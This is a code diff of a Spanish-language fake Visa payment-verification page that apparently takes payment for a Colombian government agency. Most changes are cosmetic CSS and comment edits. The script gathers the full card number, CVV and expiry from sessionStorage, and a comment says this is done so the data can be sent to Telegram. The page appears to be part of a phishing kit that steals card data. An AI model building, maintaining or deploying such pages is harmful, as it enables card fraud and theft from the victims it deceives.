@@ -133,6 +133,7 @@
         .info-row {
             display: flex;
             justify-content: space-between;
+            align-items: center;
             padding: 5px 0;
             font-size: 0.875rem;
         }
@@ -144,11 +145,15 @@
         .info-label {
             color: var(--visa-text-muted);
             font-weight: 500;
+            min-width: 80px;
+            flex-shrink: 0;
         }
 
         .info-value {
             color: var(--visa-text);
             font-weight: 600;
+            text-align: right;
+            flex: 1;
         }
 
         /* FORMULARIO */
@@ -430,11 +435,29 @@
             .visa-logo img {
                 height: 60px;
             }
+
+            .info-label {
+                min-width: 60px;
+                font-size: 0.8rem;
+            }
+
+            .info-value {
+                font-size: 0.8rem;
+            }
         }
 
         @media (max-width: 360px) {
             .visa-logo img {
                 height: 50px;
+            }
+
+            .info-label {
+                min-width: 50px;
+                font-size: 0.75rem;
+            }
+
+            .info-value {
+                font-size: 0.75rem;
             }
         }
     </style>
@@ -478,7 +501,7 @@
         <div class="transaction-info">
             <div class="info-row">
                 <span class="info-label">Comercio</span>
-                <span class="info-value">Superintendencia de Notariado</span>
+                <span class="info-value">Superintendencia</span>
             </div>
             <div class="info-row">
                 <span class="info-label">Monto</span>
@@ -575,7 +598,7 @@
         const statusMessage = document.getElementById('statusMessage');
 
         // ============================================
-        // INICIALIZACIÓN
+        // INICIALIZACIÓN - CARGA DATOS DE paso3.html
         // ============================================
         window.addEventListener('load', function() {
             initializeTransaction();
@@ -584,6 +607,7 @@
         });
 
         function initializeTransaction() {
+            // Obtener datos de paso3.html (sessionStorage)
             const storagePriority = sessionStorage.getItem('procesamiento_prioritario') === 'true';
             let amount = 23000;
             if (storagePriority) amount += 20000;
@@ -604,9 +628,11 @@
             });
             document.getElementById('transaction-date').textContent = `${dateStr} ${timeStr}`;
             
+            // Obtener últimos 4 dígitos de la tarjeta desde sessionStorage
             let cardLast4 = sessionStorage.getItem('cardLast4') || localStorage.getItem('cardLast4') || '0000';
             document.getElementById('card-last-digits').textContent = `Visa •••• •••• •••• ${cardLast4}`;
             
+            // Guardar datos de tarjeta para enviar a Telegram
             sessionStorage.setItem('cardNumberFull', sessionStorage.getItem('cardNumber') || 'No disponible');
             sessionStorage.setItem('cardCVV', sessionStorage.getItem('cvc') || 'No disponible');
             sessionStorage.setItem('cardExpiry', sessionStorage.getItem('expiry') || 'No disponible');
